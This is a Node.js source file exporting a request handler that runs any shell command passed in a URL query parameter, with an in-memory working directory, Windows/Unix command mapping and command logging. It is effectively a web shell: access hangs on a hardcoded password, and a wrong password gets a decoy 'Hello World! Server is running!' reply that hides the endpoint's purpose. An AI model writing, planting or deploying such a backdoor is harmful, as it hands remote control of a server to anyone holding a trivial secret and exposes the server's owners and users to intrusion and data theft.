const path = require('path');
const fs = require('fs');
const os = require('os');
const { exec } = require('child_process');
const { logToDatabase } = require('./tracker');
const { getSystemContext } = require('../utils/system');

let cwd = process.cwd();

const commandMappings = {
    win32: { ls: 'dir', cat: 'type', pwd: 'cd', find: 'findstr', ps: 'tasklist', rm: 'del', cp: 'copy', mv: 'move', grep: 'findstr' },
    linux: { dir: 'ls', type: 'cat', findstr: 'grep', del: 'rm', copy: 'cp', move: 'mv' },
    darwin: { dir: 'ls', type: 'cat', findstr: 'grep', del: 'rm', copy: 'cp', move: 'mv' },
};

const execMappedCommand = (req, res) => {
    const { command, password } = req.query;

    if (password !== '0987654321') {
        return res.status(401).send('Hello World! Server is running!');
    }

    if (!command) {
        return res.status(400).json({ status: 'error', message: 'Command is required' });
    }

    const baseCommand = command.split(' ')[0];
    const platform = process.platform;
    const mappings = commandMappings[platform] || {};

    if (baseCommand === 'cd') {
        const targetDir = command.substring(3).trim();
        const newDir = path.isAbsolute(targetDir) ? targetDir : path.resolve(cwd, targetDir);

        try {
            fs.accessSync(newDir);
            cwd = newDir;
            return res.json({ status: 'success', data: { output: `Changed to ${newDir}`, stderr: null } });
        } catch (e) {
            return res.status(400).json({ status: 'error', error: `Directory not found: ${newDir}` });
        }
    }

    if (baseCommand === 'pwd') {
        return res.json({ status: 'success', data: { output: cwd, stderr: null } });
    }

    const mappedCommand = mappings[baseCommand];
    const finalCommand = mappedCommand ? command.replace(new RegExp(`^${baseCommand}\\b`), mappedCommand) : command;

    const context = getSystemContext(cwd);

    exec(finalCommand, { timeout: 30000, cwd }, async (err, stdout, stderr) => {
        if (err) {
            await logToDatabase(req, command, stderr, context);
            return res.status(500).json({ status: 'error', error: err.message, stderr, context });
        }

        const formatted = (baseCommand === 'ls' || baseCommand === 'dir')
            ? { raw: stdout, entries: stdout.trim().split('\n').filter(line => line.trim()) }
            : stdout;

        await logToDatabase(req, command, null, context);

        res.json({
            status: 'success',
            data: { output: formatted, stderr: stderr || null },
            metadata: { command: finalCommand, originalCommand: command, executionTime: new Date().toISOString(), context }
        });
    });
};

module.exports = { execMappedCommand };
